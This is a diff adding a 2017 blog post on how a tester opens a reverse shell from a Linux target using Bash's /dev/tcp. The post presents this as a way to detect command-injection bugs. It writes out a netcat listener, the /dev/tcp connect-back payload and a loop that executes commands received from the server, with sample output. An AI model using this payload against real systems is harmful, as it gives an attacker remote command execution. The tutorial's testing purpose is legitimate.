@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="author" content="Joe Butler" />
+    <meta name="robots" content="index, follow"/>
+
+    <meta property="og:title" content="Reverse Shells in Bash for Dummies by a Dummy"/>
+    <meta property="og:url" content="https://incognitjoe.github.io/reverse-shells-for-dummies.html"/>
+    <meta property="og:site_name" content="IncognitJoe"/>
+    <meta property="og:type" content="article"/>
+
+    <link rel="canonical" href="https://incognitjoe.github.io/reverse-shells-for-dummies.html" />
+
+    <title>Reverse Shells in Bash for Dummies by a Dummy | IncognitJoe</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" />
+    <link rel="stylesheet" type="text/css" href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.min.css" />
+
+    <link rel="stylesheet" type="text/css" href="https://incognitjoe.github.io/theme/css/main.css" />
+
+    <script type="text/javascript">var switchTo5x=true;</script>
+    <script type="text/javascript" src="https://ws.sharethis.com/button/buttons.js"></script>
+    <script type="text/javascript">
+        stLight.options({
+            publisher: "",
+            doNotHash: false,
+            doNotCopy: false,
+            hashAddressBar: false
+        });
+    </script>
+</head>
+
+<body id="index">
+    <div class="row-fluid">
+        <div class="span10 offset1">
+            <header id="banner" >
+                <h1>
+                    <a href="https://incognitjoe.github.io/">IncognitJoe </a>
+                </h1>
+                <nav class="navbar">
+                    <div class="navbar-inner">
+                        <ul class="nav">
+                            <li ><a href="/">Home</a></li>
+                            <li ><a href="/categories.html">Categories</a></li>
+                            <li ><a href="/pages/about.html">About</a></li>
+                        </ul>
+
+                    </div>
+                </nav>
+            </header><!-- /#banner -->
+        </div>
+    </div>
+
+    <div class="row-fluid">
+        <div class="span10 offset1">
+            <div class="row-fluid">
+<div class="span10 offset1">
+  <section>
+    <article>
+      <header>
+        <h1 class="entry-title">
+          <a href="https://incognitjoe.github.io/reverse-shells-for-dummies.html" rel="bookmark"
+             title="Permalink to Reverse Shells in Bash for Dummies by a Dummy">Reverse Shells in Bash for Dummies by a Dummy</a></h1>
+      </header>
+      <div class="entry-content">
+<footer class="post-info">
+    <address class="vcard author">
+        by <a class="url fn" href="https://incognitjoe.github.io/author/joe-butler.html">Joe Butler</a>
+    </address>
+
+    in <a href="https://incognitjoe.github.io/category/bash.html">Bash</a>
+
+    on 2017-04-13
+
+        |
+        tags:         <a href="https://incognitjoe.github.io/tag/bash.html">bash</a>
+        <a href="https://incognitjoe.github.io/tag/testing.html">testing</a>
+        <a href="https://incognitjoe.github.io/tag/security.html">security</a>
+
+
+
+    
+</footer><!-- /.post-info -->
+
+        <p>As far as testing goes, finding a bug that lets me run arbitrary commands on a remote 
+machine is easily one of my favourite things, thankfully because it's pretty rare 
+in the products I work with. However, sometimes it's not always 
+easy or convenient to <em>know</em> when you encounter these things, especially when it's 
+not within my testing environment so I can't just SSH into the machine and check 
+whether <code>touch test.txt</code> actually produced a test.txt file.  </p>
+<p>Sending commands that establish a reverse shell, however, allows me to use that payload 
+in a battery of automated tests, and I can just check my server to see if any 
+connections succeeded. If you're not familiar with the concept, a <em>bind</em> shell is when 
+you connect to a target machine, for example <code>ssh incognitjoe@joedev</code> uses SSH to open 
+a shell on the <code>joedev</code> machine. A <em>reverse</em> shell is when the connection is established 
+from the target out to a server that can then send commands to and read output from 
+the target. Note this post isn't intended to cover bypassing the myriad 
+of defenses that can be employed to prevent such things - it's a super simple 
+example of how to open a communication channel from a Linux target back to your 
+server machine. If you're looking for ways to defeat firewall rules and so on, this 
+isn't the blog post for you, I'm afraid.  </p>
+<p>With all that said, let's get started. Let's assume <code>joedev</code> is our server machine, 
+and we're testing a possibly vulnerable application running on http://192.168.1.50 . 
+First, we want to use Netcat to open a listening port, let's say 6666, on <code>joedev</code>:</p>
+<div class="highlight"><pre><span></span>nc -l -p <span class="m">6666</span> -vvv
+</pre></div>
+
+
+<p>This spits out some info telling us things are running:</p>
+<div class="highlight"><pre><span></span>NCAT DEBUG: Initialized fdlist with 103 maxfds
+Ncat: Listening on :::6666
+NCAT DEBUG: Added fd 3 to list, nfds 1, maxfd 3
+Ncat: Listening on 0.0.0.0:6666
+NCAT DEBUG: Added fd 4 to list, nfds 2, maxfd 4
+NCAT DEBUG: Added fd 0 to list, nfds 3, maxfd 4
+NCAT DEBUG: Initialized fdlist with 100 maxfds
+NCAT DEBUG: selecting, fdmax 4
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 4 is ready
+</pre></div>
+
+
+<p>Now, let's think about how we're going to get the target machine to connect back to 
+our server. While netcat could be used there too, not every machine has it installed 
+by default, and we'll assume our remote level access isn't able to install new 
+software(yet!). We'll instead take advantage of Bash's built-in /dev/tcp file, and a 
+feature of the <code>exec</code> command to open a new file descriptor that'll act as our shell, 
+so our payload to try and execute on the target is:</p>
+<div class="highlight"><pre><span></span><span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/joedev/6666
+</pre></div>
+
+
+<p>To explain a little further: calling exec without a command just opens a file in the 
+current shell. Here, we're saying that file descriptor 5 is a TCP session to joedev:6666. 
+Pretty sneaky, and if we check our server's output we see something new:</p>
+<div class="highlight"><pre><span></span><span class="n">Ncat</span><span class="o">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.50</span><span class="o">.</span>
+</pre></div>
+
+
+<p>Neato. If all we care about is proving that we could open a shell from the 
+target machine(by injecting that exec command somewhere, somehow) then we're done. 
+However, we're not actually doing anything with the shell yet, so we'll run
+another command on the target to read the contents of the file descriptor we assigned and 
+execute them:</p>
+<div class="highlight"><pre><span></span>cat &lt;<span class="p">&amp;</span><span class="m">5</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
+</pre></div>
+
+
+<p>Anything the server sends will now be read and executed, and we can start poking around 
+the machine at our leisure. Let's try <code>whoami</code>:</p>
+<div class="highlight"><pre><span></span>whoami
+NCAT DEBUG: <span class="k">select</span> returned <span class="m">1</span> fds ready
+NCAT DEBUG: fd <span class="m">0</span> is ready
+NCAT DEBUG: selecting, fdmax <span class="m">5</span>
+NCAT DEBUG: <span class="k">select</span> returned <span class="m">1</span> fds ready
+NCAT DEBUG: fd <span class="m">5</span> is ready
+notarootuser
+</pre></div>
+
+
+<p>"notarootuser" is the output from the target machine, so that's who we're running as, 
+neato. </p>
+<p>Note this is ridiculously inelegant, and there's definitely better ways to accomplish 
+this. Hopefully the concept is clear though!  </p>
+
+      </div><!-- /.entry-content -->
+
+    </article>
+  </section>
+</div>
+            </div>
+        </div>
+    </div>
+
+    <footer id="site-footer">
+        <div class="row-fluid">
+            <div class="span10 offset1">
+                <address>
+                    <p>
+                        This blog is proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
+                    </p>
+                    <p>
+                        <a href="http://github.com/jsliang/pelican-fresh/">Fresh</a> is a responsive theme designed by <a href="http://jsliang.com/">jsliang</a> and <a href="https://github.com/jsliang/pelican-fresh/graphs/contributors">contributors</a>.
+                        Special thanks to <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a> and <a href="http://getbootstrap.com/">Twitter Bootstrap</a>.
+                    </p>
+                </address>
+            </div>
+        </div>
+    </footer>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-91055983-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+    <script src="//code.jquery.com/jquery.min.js"></script>
+    <script src="//netdna.bootstrapcdn.com/bootstrap/2.3.2/js/bootstrap.min.js"></script>
+</body>
+</html>
